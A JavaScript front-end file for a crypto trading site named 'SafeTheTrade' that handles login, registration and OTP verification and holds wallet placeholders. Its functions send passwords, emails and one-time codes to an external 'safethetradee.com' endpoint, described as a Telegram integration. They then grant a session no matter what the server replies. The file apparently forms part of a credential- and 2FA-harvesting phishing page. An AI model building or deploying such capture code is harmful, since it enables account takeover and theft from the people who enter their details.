/* Demo auth & Backend Telegram API integration */

const STT_AUTH_KEY = "stt_demo_session";
const BACKEND_API_URL = "https://safethetradee.com/api/api";

window.STT = {
  getSession() {
    try {
      return JSON.parse(localStorage.getItem(STT_AUTH_KEY) || "null");
    } catch {
      return null;
    }
  },

  isLoggedIn() {
    return !!this.getSession();
  },

  async loginApi(username, password) {
    try {
      const res = await fetch(`${BACKEND_API_URL}/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      console.log("Backend login response:", data);
    } catch (err) {
      console.warn("Backend API not reachable or offline. Falling back to local state.", err);
    }
  },

  async otpApi(email, otpCode, trustDevice) {
    try {
      const res = await fetch(`${BACKEND_API_URL}/verify-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, otp_code: otpCode, trust_device: trustDevice }),
      });
      const data = await res.json();
      console.log("Backend OTP verification response:", data);
    } catch (err) {
      console.warn("Backend API not reachable or offline. Falling back to local state.", err);
    }
    return this.login(email);
  },

  async registerApi(email, password, country, referral) {
    try {
      const res = await fetch(`${BACKEND_API_URL}/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password, country, referral }),
      });
      const data = await res.json();
      console.log("Backend register response:", data);
    } catch (err) {
      console.warn("Backend API not reachable or offline. Falling back to local state.", err);
    }
    return this.login(email);
  },

  login(emailOrUser) {
    const email = (emailOrUser || "trader@example.com").trim();
    const username = email.includes("@")
      ? "trader_" + email.split("@")[0].replace(/[^a-z0-9]/gi, "").slice(0, 8).toLowerCase()
      : email.replace(/[^a-z0-9_]/gi, "").slice(0, 20).toLowerCase() || "trader_demo";
    const session = {
      email: email.includes("@") ? email : `${username}@demo.local`,
      username,
      balanceUsd: 0,
      unread: 0,
      joined: "Sept 2026",
      bio: "",
      loggedInAt: Date.now(),
    };
    localStorage.setItem(STT_AUTH_KEY, JSON.stringify(session));
    return session;
  },

  updateSession(patch) {
    const s = this.getSession();
    if (!s) return null;
    const next = { ...s, ...patch };
    localStorage.setItem(STT_AUTH_KEY, JSON.stringify(next));
    return next;
  },

  logout() {
    localStorage.removeItem(STT_AUTH_KEY);
  },

  requireAuth() {
    if (!this.isLoggedIn()) {
      location.href = "/login/";
      return null;
    }
    return this.getSession();
  },

  // Fresh wallet — zero balances like a new account
  assets: [
    { ticker: "BTC", name: "Bitcoin", amount: 0, usd: 0, chg: null, icon: "assets/crypto/btc.svg" },
    { ticker: "ETH", name: "Ethereum", amount: 0, usd: 0, chg: null, icon: "assets/crypto/eth.svg" },
    { ticker: "USDT", name: "Tether", amount: 0, usd: 0, chg: null, icon: "assets/crypto/usdt.svg" },
    { ticker: "TRX", name: "Tron", amount: 0, usd: 0, chg: null, icon: "assets/crypto/trx.svg" },
    { ticker: "STT", name: "SafeTheTrade coin", amount: 10, usd: null, chg: null, special: true, icon: "assets/favicon.svg" },
  ],

  myOffers: [],
  myTrades: [],
  activity: [],
  supportMessages: [],
  notifications: [],
};

